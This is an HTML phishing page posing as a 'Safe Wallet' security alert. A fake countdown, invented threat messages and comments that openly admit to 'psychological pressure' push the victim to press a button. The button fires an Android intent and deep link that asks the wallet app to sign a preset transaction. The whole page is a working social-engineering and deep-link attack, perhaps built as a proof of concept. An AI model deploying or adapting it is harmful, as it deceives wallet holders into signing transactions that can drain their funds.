<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Safe Wallet - Security Update Required</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            padding: 40px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }

        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 20px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
            font-weight: bold;
        }

        .title {
            font-size: 24px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 16px;
            color: #666;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .alert-box {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 30px;
            text-align: left;
        }

        .alert-icon {
            color: #f39c12;
            font-size: 20px;
            margin-bottom: 10px;
        }

        .alert-title {
            font-weight: 600;
            color: #856404;
            margin-bottom: 8px;
        }

        .alert-text {
            color: #856404;
            font-size: 14px;
            line-height: 1.4;
        }

        .button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 12px;
            padding: 16px 32px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s ease;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
        }

        .button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
        }

        .button:active {
            transform: translateY(0);
        }

        .warning {
            font-size: 12px;
            color: #999;
            margin-top: 20px;
            line-height: 1.4;
        }

        .transaction-details {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            text-align: left;
        }

        .transaction-title {
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 10px;
        }

        .transaction-info {
            font-size: 14px;
            color: #666;
            margin-bottom: 5px;
        }

        .address {
            font-family: 'Courier New', monospace;
            background: #e9ecef;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            word-break: break-all;
        }

        .urgent-badge {
            background: #dc3545;
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            display: inline-block;
            margin-bottom: 15px;
        }

        .countdown {
            background: #dc3545;
            color: white;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-weight: 600;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo">üõ°Ô∏è</div>

        <div class="urgent-badge">URGENT SECURITY ALERT</div>

        <h1 class="title">Safe Wallet Security Update</h1>
        <p class="subtitle">Your wallet requires immediate attention to prevent unauthorized access</p>

        <div class="countdown" id="countdown">
            Time remaining: <span id="timer">05:00</span>
        </div>

        <div class="alert-box">
            <div class="alert-icon">‚ö†Ô∏è</div>
            <div class="alert-title">Critical Security Issue Detected</div>
            <div class="alert-text">
                We've detected suspicious activity on your Safe wallet. To protect your funds,
                you must verify your identity and update your security settings immediately.
            </div>
        </div>

        <div class="transaction-details">
            <div class="transaction-title">Security Verification Required</div>
            <div class="transaction-info">
                <strong>Transaction ID:</strong><br>
                <span class="address">0xa2eef439a3e1fb47fac4b3377bcca853a8e9e501fcdd171b4f46457a5feabaf0</span>
            </div>
            <div class="transaction-info">
                <strong>Signer Address:</strong><br>
                <span class="address">0x0CE7910b4eF24a5Caf13186fCb108c9fbcE57B08</span>
            </div>
        </div>

        <button class="button" onclick="triggerIntent()">
            üîê Verify Identity & Secure Wallet
        </button>

        <p class="warning">
            ‚ö†Ô∏è This verification is required to prevent unauthorized access to your funds.
            Failure to complete this step within the time limit may result in account suspension.
        </p>
    </div>

    <script>
        // Countdown timer to create urgency
        let timeLeft = 300; // 5 minutes
        const timerElement = document.getElementById('timer');

        const countdown = setInterval(() => {
            timeLeft--;
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

            if (timeLeft <= 0) {
                clearInterval(countdown);
                timerElement.textContent = "00:00";
                document.querySelector('.countdown').style.background = '#dc3545';
                document.querySelector('.countdown').textContent = 'TIME EXPIRED - IMMEDIATE ACTION REQUIRED';
            }
        }, 1000);

        function triggerIntent() {
            // Create the intent URI that will trigger the SafeWallet app
            const intentUri = 'intent://sign-transaction?txId=0x13fb089b08d4d6a3e3f99035e18dfa40cb349038ed44df03e06df03c6c955677&signerAddress=0x0CE7910b4eF24a5Caf13186fCb108c9fbcE57B08#Intent;scheme=myapp;package=global.safe.mobileapp.dev;end';

            // Alternative direct deep link (for testing)
            const deepLink = 'myapp://sign-transaction?txId=0x13fb089b08d4d6a3e3f99035e18dfa40cb349038ed44df03e06df03c6c955677&signerAddress=0x0CE7910b4eF24a5Caf13186fCb108c9fbcE57B08';

            try {
                // Try to open the intent URI
                window.location.href = intentUri;

                // Fallback: try direct deep link
                setTimeout(() => {
                    window.location.href = deepLink;
                }, 1000);

                // Show success message
                document.querySelector('.button').textContent = 'üîÑ Opening Safe Wallet...';
                document.querySelector('.button').disabled = true;

            } catch (error) {
                console.error('Failed to trigger intent:', error);
                alert('Please ensure Safe Wallet is installed on your device.');
            }
        }

        // Add some psychological pressure
        setTimeout(() => {
            const alertBox = document.querySelector('.alert-box');
            alertBox.style.background = '#f8d7da';
            alertBox.style.borderColor = '#f5c6cb';
            alertBox.querySelector('.alert-title').textContent = 'üö® URGENT: Multiple Failed Login Attempts Detected';
            alertBox.querySelector('.alert-text').textContent = 'We have detected 3 failed login attempts from an unknown IP address. Your wallet is at risk of being compromised. Immediate verification required.';
        }, 30000); // After 30 seconds

        // Simulate "live" security monitoring
        setInterval(() => {
            const randomThreats = [
                'Suspicious transaction detected',
                'Unauthorized access attempt blocked',
                'Security protocol violation detected',
                'Multiple failed authentication attempts'
            ];

            const randomThreat = randomThreats[Math.floor(Math.random() * randomThreats.length)];
            console.log(`[SECURITY ALERT] ${randomThreat}`);
        }, 15000);
    </script>
</body>

</html>